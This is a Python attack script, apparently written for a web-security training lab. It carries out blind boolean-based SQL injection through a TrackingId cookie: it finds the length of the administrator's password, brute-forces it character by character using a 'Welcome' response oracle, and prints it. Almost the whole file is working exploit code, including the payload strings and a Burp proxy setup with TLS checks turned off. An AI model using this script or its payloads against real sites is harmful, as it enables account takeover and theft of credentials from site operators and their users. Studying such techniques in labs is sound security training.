import sys
import requests
import urllib3
import urllib
'''
Make sure to add the cookies in the script

length payload
' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) > i)= 'administrator

bruteforce payload
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), i, 1) = j AND '1'='1
'''
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def pass_len(url, proxies):
    for i in range (1, 32):
        payload = f"' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) = {i})= 'administrator"

        encoded_payload = urllib.parse.quote(payload)
        cookies = {'TrackingId':''+encoded_payload, 'session':''} 
        r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
        if 'Welcome' in r.text:
            continue
        else:
            return i-1
        
    return None
    
def bruter(url, proxies):
    pass_length = pass_len(url, proxies)
    extracted = ''
    for i in range(1, pass_length+1):
        for j in range(32, 126): #ASCII values of alphanumeric + special characters range
            payload =  f"' AND ascii(SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1)) = {j} AND '1'='1"

            encoded_payload = urllib.parse.quote(payload)
            cookies = {'TrackingId':''+encoded_payload, 'session':''}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

            if 'Welcome' not in r.text:
                sys.stdout.write('\r' + extracted + chr(j))
                sys.stdout.flush()

            else:
                extracted += chr(j)
                sys.stdout.write('\r' + extracted)
                sys.stdout.flush()
                break
    
    print(f'the administrator password is {extracted}')

def main():
    proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
    if len(sys.argv) != 2:
        print("[+] Usage: bruter <url>")
        print("[+] Example: python3 bruter.py www.example.com")

    url = sys.argv[1]
    print("[+] Retrieving administrator password...")

    try:
        bruter(url, proxies)
    except KeyboardInterrupt:
        print('\n [!] interrupted by user')
        sys.exit()

if __name__ == "__main__":
    main()